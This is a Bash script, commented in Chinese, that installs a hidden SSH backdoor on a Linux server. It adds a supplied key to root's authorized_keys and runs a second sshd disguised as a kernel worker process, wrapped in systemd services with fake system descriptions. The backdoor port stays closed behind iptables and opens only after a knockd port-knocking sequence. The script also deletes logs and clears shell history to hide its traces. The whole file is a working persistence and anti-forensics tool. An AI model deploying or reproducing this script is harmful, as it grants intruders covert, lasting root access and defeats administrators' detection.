#!/bin/bash

# ==========================================
# 远程脚本：动态参数安全校验
# ==========================================
if [ -z "$SSH_KEY" ] || [ -z "$MY_PORT" ] || [ -z "$MY_SEQ" ]; then
    echo "[-] 错误：缺少必要的环境变量参数！"
    echo "[-] 请确保传入了 SSH_KEY, MY_PORT 和 MY_SEQ"
    exit 1
fi

set -e

# 清理可能残存的旧痕迹
rm -f /var/log/knockd.log 2>/dev/null

# 静默安装必要组件
DEBIAN_FRONTEND=noninteractive apt-get update -y -qq >/dev/null
DEBIAN_FRONTEND=noninteractive apt-get install knockd iptables-persistent -y -qq >/dev/null

# A. 配置隐藏 SSH 实例（伪装路径与进程）
CONF_DIR="/var/lib/systemd/timers"
CONF_FILE="${CONF_DIR}/clear-cache.conf"
PID_FILE="/var/run/clear-cache.pid"

mkdir -p "$CONF_DIR"
cat << EOF > "$CONF_FILE"
# System temporary config
Port $MY_PORT
PasswordAuthentication no
PubkeyAuthentication yes
PidFile $PID_FILE
LogLevel QUIET
EOF

# 写入动态公钥
mkdir -p /root/.ssh
chmod 700 /root/.ssh
if ! grep -q "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
    echo "$SSH_KEY" >> /root/.ssh/authorized_keys
fi
chmod 600 /root/.ssh/authorized_keys

# B. 创建伪装 SSH 系统服务
cat << EOF > "/etc/systemd/system/systemd-tmp-fallback.service"
[Unit]
Description=System Virtual Memory Fallback Service
After=network.target
ConditionPathExists=$CONF_FILE

[Service]
Type=notify
ExecStart=/bin/bash -c "exec -a [kworker/rt] /usr/sbin/sshd -D -f $CONF_FILE"
ExecReload=/bin/kill -HUP \$MAINPID
KillMode=process
Restart=on-failure
RestartSec=42s
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# C. 配置防火墙默认 DROP 该隐藏端口
iptables -A INPUT -p tcp --dport $MY_PORT -j DROP
netfilter-persistent save >/dev/null 2>&1

# D. 配置端口敲击服务 knockd
INTERFACE=$(ip route show | grep default | awk '{print $5}' | head -n1)

cat << EOF > "/etc/knockd.conf"
[options]
    UseSyslog
    Interface = $INTERFACE

[opencloseSSH]
    sequence    = $MY_SEQ
    seq_timeout = 10
    tcpflags    = syn
    start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport $MY_PORT -j ACCEPT
    cmd_timeout   = 10
    stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp --dport $MY_PORT -j ACCEPT
EOF

# E. 创建伪装 knockd 服务
cat << EOF > "/etc/systemd/system/systemd-log-analyzer.service"
[Unit]
Description=System Log Security Analyzer
After=network.target

[Service]
ExecStart=/bin/bash -c "exec -a [syslog-analyzer] /usr/sbin/knockd -i $INTERFACE -c /etc/knockd.conf"
Restart=on-failure
SuccessExitStatus=1

[Install]
WantedBy=multi-user.target
EOF

# 启动并使能所有伪装服务
systemctl daemon-reload
systemctl enable --now systemd-tmp-fallback >/dev/null 2>&1
systemctl enable --now systemd-log-analyzer >/dev/null 2>&1

# ==========================================
# 痕迹清理
# ==========================================
apt-get clean
rm -rf /var/lib/apt/lists/*

# 清理当前会话的命令历史
history -c
cat /dev/null > ~/.bash_history

echo "[+] 远程隐蔽 SSH 服务部署成功！"
